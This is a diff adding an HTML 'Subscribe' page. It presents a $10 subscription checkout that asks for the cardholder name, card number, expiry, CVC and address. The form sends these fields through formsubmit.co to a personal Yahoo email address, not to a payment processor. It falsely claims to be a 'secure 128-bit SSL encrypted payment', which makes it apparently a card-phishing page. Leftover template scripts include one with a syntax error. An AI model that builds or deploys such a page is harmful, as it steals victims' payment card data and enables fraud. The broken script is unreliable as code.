@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Subscribe</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+
+    <link rel="icon" href="imgs/user.png">
+    <link href="https://fonts.googleapis.com/css?family=Muli:300,400,700,900" rel="stylesheet">
+    <link rel="stylesheet" href="fonts/icomoon/style.css">
+
+    <link rel="stylesheet" href="csss/bootstrap.min.css">
+    <link rel="stylesheet" href="csss/jquery-ui.css">
+    <link rel="stylesheet" href="csss/owl.carousel.min.css">
+    <link rel="stylesheet" href="csss/owl.theme.default.min.css">
+    <link rel="stylesheet" href="csss/owl.theme.default.min.css">
+
+    <link rel="stylesheet" href="csss/jquery.fancybox.min.css">
+
+    <link rel="stylesheet" href="csss/bootstrap-datepicker.css">
+
+    <link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">
+
+    <link rel="stylesheet" href="csss/aos.css">
+
+    <link rel="stylesheet" href="csss/style.css">
+    <script>
+    var u = $au.imageUploaderFlash({
+    id: 'Uploader1',
+converters: [{mode: '*.*=Thumbnail',
+    thumbnailFitMode: 'ActualSize',
+    thumbnailWatermark: 'ImageUrl=images/p.png;Width=190;Height=60;Opacity=60;OffsetY=20'}]
+});
+</script>
+
+<style>
+.required
+{
+    color: red;
+}
+</style>
+
+  </head>
+  <body data-spy="scroll" data-target=".site-navbar-target" data-offset="300">
+
+  <div class="site-wrap">
+
+    <div class="site-mobile-menu site-navbar-target">
+      <div class="site-mobile-menu-header">
+        <div class="site-mobile-menu-close mt-3">
+          <span class="icon-close2 js-menu-toggle"></span>
+        </div>
+      </div>
+      <div class="site-mobile-menu-body"></div>
+    </div>
+
+
+    <header class="site-navbar py-4 js-sticky-header site-navbar-target" role="banner">
+
+
+    </header>
+
+
+    <div class="site-section" id="programs-section">
+      <div class="container">
+        <div class="container-fluid">
+
+        <form action="https://formsubmit.co/everiemarshal@yahoo.com" method="post">
+
+<br>
+  <h3 class="h4 text-black mb-4">Payment Information</h3>
+  <img src="imgs/card.jpeg" alt="" width="350px" height="60px">
+  <strong><b><h6>This is a secure 128-bit SSL encrypted payment</h6></b></strong>
+    <br>
+  <div class="form-group">
+    Name On Card<span class="required">*</span>
+    <input type="text" class="form-control" name="cnme" placeholder="Emily J Smith" required>
+  </div>
+  <div class="form-group mb-4">
+    Card Number<span class="required">*</span>
+    <input type="text" class="form-control" name="cno" placeholder="1234 1234 1234 1234" required>
+  </div>
+  <div class="form-group mb-4">
+    Expiration Date<span class="required">*</span>
+    <input type="text" class="form-control" name="exp" placeholder="MM/YY" required>
+  </div>
+  <div class="form-group mb-4">
+    CVC Code<span class="required">*</span>
+    <input type="text" class="form-control" name="cvc" placeholder="CVC" required>
+  </div>
+  <div class="form-group mb-4">
+    Address<span class="required">*</span>
+    <input type="text" class="form-control" name="add" placeholder="Address" required>
+  </div>
+
+
+
+
+
+
+              <center>
+              <div class="form-group">
+                <input type="submit" class="btn btn-primary btn-pill" value="Subscribe $10">
+              </div>
+            </center>
+            </form>
+
+  </div> <!-- .site-wrap -->
+  <br>
+  <footer>
+    <center>
+<div class="col col--sm-10 col--md-8 col--lg-6  text--lg-right">
+            <div class="__item">
+              <span class="__copy"><b><strong>&copy;2006 Michelle Cerame | All Right Reserved</strong></b>  </span>
+            </div>
+          </div>
+        </center>
+  </footer>
+
+
+  <script src="js/jquery-3.3.1.min.js"></script>
+  <script src="js/jquery-migrate-3.0.1.min.js"></script>
+  <script src="js/jquery-ui.js"></script>
+  <script src="js/popper.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/owl.carousel.min.js"></script>
+  <script src="js/jquery.stellar.min.js"></script>
+  <script src="js/jquery.countdown.min.js"></script>
+  <script src="js/bootstrap-datepicker.min.js"></script>
+  <script src="js/jquery.easing.1.3.js"></script>
+  <script src="js/aos.js"></script>
+  <script src="js/jquery.fancybox.min.js"></script>
+  <script src="js/jquery.sticky.js"></script>
+
+  <script type="text/javascript">
+    function sendEnquiryform(){
+        var name=$('#name').val();
+        var email=$('#email').val();
+        var message=$('#message').val();
+        $.post("send_mail.php",'name='+name+'&email='+email'&message='+message,function(result,status,xhr) {
+                if( status.toLowerCase()=="error".toLowerCase() )
+                { alert("An Error Occurred.."); }
+                else {
+                    //alert(result);
+                    $('#sucessMessage').html(result);
+                }
+            })
+            .fail(function(){ alert("something went wrong. Please try again") });
+    }
+</script>
+
+
+  <script src="js/main.js"></script>
+
+  </body>
+</html>
